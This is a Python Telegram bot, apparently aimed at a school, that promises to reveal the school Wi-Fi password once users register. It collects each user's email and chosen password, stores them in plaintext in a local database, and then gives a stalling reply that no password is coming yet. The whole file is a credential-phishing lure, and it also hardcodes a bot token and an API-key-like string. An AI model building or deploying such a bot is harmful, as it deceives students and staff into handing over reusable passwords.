import telebot
import sqlite3
import re


import gspread
from google.oauth2.service_account import Credentials

# Путь к файлу ключа JSON
json_keyfile = 'AIzaSyDIp2UsaI4Km3AIgJiGFwSoTVzajQg0o5I'

# Создание подключения к Google Таблицам с использованием файла ключа JSON
scope = ['https://spreadsheets.google.com/feeds', 'https://www.googleapis.com/auth/drive']
credentials = Credentials.from_service_account_file(json_keyfile, scopes=scope)
gc = gspread.authorize(credentials)

# Открытие Google Таблицы и получение ее содержимого
sheet = gc.open('TimaAndMe').sheet1
data = sheet.get_all_records()




# Создаем экземпляр бота
bot = telebot.TeleBot("6995631355:AAFTFSSnvqbHZaZV8uVLxVRZanuQOANMN70")
# Функция для проверки формата email
def is_valid_email(email: str) -> bool:
    email_regex = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return re.match(email_regex, email) is not None
# Функция для проверки формата пароля
def is_valid_password(password: str) -> bool:
    return len(password) >= 6
# Функция для создания таблицы пользователей
def create_users_table():
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS users
                      (id INTEGER PRIMARY KEY, email TEXT, password TEXT)''')
    conn.commit()
    conn.close()
create_users_table()  # Создаем таблицу при запуске бота
# Функция для обработки команды /start
@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, 'Добро пожаловать!🤗 Чтобы узнать пароль от WI-FI школы зарегистрируйтесь, отправьте свой email и пароль через пробел😉')
# Функция для обработки сообщений с email и паролем
@bot.message_handler(func=lambda message: True)
def register(message):
    # Разбиваем сообщение на email и пароль
    message_text = message.text.split()
    if len(message_text) != 2:
        bot.reply_to(message, 'Пожалуйста, отправьте email и пароль через пробел❗️😊')
        return
    email, password = message_text
    # Проверяем формат email и пароля
    if not is_valid_email(email):
        bot.reply_to(message, 'Неверный формат email.')
        return
    if not is_valid_password(password):
        bot.reply_to(message, 'Пароль должен содержать не менее 6 символов‼️')
        return
    # Сохраняем email и пароль в базе данных
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute("INSERT INTO users (email, password) VALUES (?, ?)", (email, password))
    conn.commit()
    conn.close()
    bot.reply_to(message, "Извените но наши сервера ещё не запустились😊🙃Советуем ожидать пароль от сетей как: *O'qituvchi* и *O'quvchi* в вашей Электронной почте!😊🙃")
# Запускаем бота
bot.polling()